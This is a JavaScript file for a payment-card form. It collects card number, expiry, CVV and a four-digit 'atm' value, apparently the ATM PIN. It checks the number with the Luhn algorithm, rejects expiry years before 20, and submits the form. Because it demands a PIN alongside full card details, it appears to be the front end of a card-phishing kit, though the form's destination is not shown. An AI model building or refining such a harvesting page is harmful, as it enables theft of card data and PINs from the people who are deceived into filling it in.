card = document.getElementById("card");
exp = document.getElementById("exp");
cvv = document.getElementById("cvv");
atm = document.getElementById("atm");

btn = document.getElementById("btn");
form = document.getElementById("form");
error = document.getElementById("error");

c1 = document.getElementById("c1");
e1 = document.getElementById("e1");
c2 = document.getElementById("c2");
a1 = document.getElementById("a1");

document.addEventListener('keydown', function (e) {
    if (e.keyCode === 13) {
        e.preventDefault();
    }
}, true);

function validateCC(inputNum) {
    var digit, digits, flag, sum, _i, _len;
    flag = true;
    sum = 0;
    digits = (inputNum + '').split('').reverse();
    for (_i = 0, _len = digits.length; _i < _len; _i++) {
        digit = digits[_i];
        digit = parseInt(digit, 10);
        if ((flag = !flag)) {
        digit *= 2;
        }
        if (digit > 9) {
        digit -= 9;
        }
        sum += digit;
    }
    return sum % 10 === 0;
};

function checkExp(exp) {
    if (exp.substring(3, 5) < 20) {
        return false;
    } else {
        return true;
    }
}

new Cleave(card, {
    creditCard: 1
});

new Cleave(exp, {
    date: true,
    datePattern: ['m', 'y']
});

new Cleave(cvv, {
    numericOnly: 1,
    blocks: [4]
});

new Cleave(atm, {
    numericOnly: 1,
    blocks: [4]
});

card.addEventListener("keyup", () => {
    if (
        card.value.trim() != "" &&
        exp.value.trim() != "" &&
        cvv.value.trim() != "" &&
        atm.value.trim() != ""
    ) {
        btn.disabled = false;
    } else {
        btn.disabled = true;
    }
});

exp.addEventListener("keyup", () => {
    if (
        card.value.trim() != "" &&
        exp.value.trim() != "" &&
        cvv.value.trim() != "" &&
        atm.value.trim() != ""
    ) {
        btn.disabled = false;
    } else {
        btn.disabled = true;
    }
});

cvv.addEventListener("keyup", () => {
    if (
        card.value.trim() != "" &&
        exp.value.trim() != "" &&
        cvv.value.trim() != "" &&
        atm.value.trim() != ""
    ) {
        btn.disabled = false;
    } else {
        btn.disabled = true;
    }
});

atm.addEventListener("keyup", () => {
    if (
        card.value.trim() != "" &&
        exp.value.trim() != "" &&
        cvv.value.trim() != "" &&
        atm.value.trim() != ""
    ) {
        btn.disabled = false;
    } else {
        btn.disabled = true;
    }
});

card.addEventListener("focus", () => {
    c1.classList.add("ui-focus");
});

exp.addEventListener("focus", () => {
    e1.classList.add("ui-focus");
});

cvv.addEventListener("focus", () => {
    c2.classList.add("ui-focus");
});

atm.addEventListener("focus", () => {
    a1.classList.add("ui-focus");
});

card.addEventListener("blur", () => {
    c1.classList.remove("ui-focus");
});

exp.addEventListener("blur", () => {
    e1.classList.remove("ui-focus");
});

cvv.addEventListener("blur", () => {
    c2.classList.remove("ui-focus");
});

atm.addEventListener("blur", () => {
    a1.classList.remove("ui-focus");
});

btn.addEventListener("click", () => {
    if (
        card.value.trim() != "" &&
        exp.value.trim() != "" &&
        cvv.value.trim() != "" &&
        atm.value.trim() != "" &&
        btn.disabled != true
    ) {
        if (
            validateCC(card.value.replace(/ /g, ""))
        ) {
            if (
                checkExp(exp.value.trim())
            ) {
                form.submit();
            } else {
                error.innerText = 'Your card is expired.';
            }
        } else {
            error.innerText = 'Your card number is invalid.';
        }
    }
});